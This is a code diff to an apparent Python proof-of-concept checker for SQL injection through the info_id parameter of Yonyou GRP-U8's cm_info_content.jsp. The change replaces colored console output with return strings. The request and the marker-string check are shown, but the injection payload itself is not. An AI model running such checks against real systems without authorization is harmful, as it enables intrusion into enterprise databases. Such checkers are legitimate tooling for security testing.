@@ -8,8 +8,8 @@ description: 文件/R9iPortal/cm/cm_info_content.jsp中,参数info_id存在SQL�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_cm_info_content_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class yonyou_cm_info_content_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在用友GRP-U8 sql注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在用友GRP-U8 sql注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_cm_info_content_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
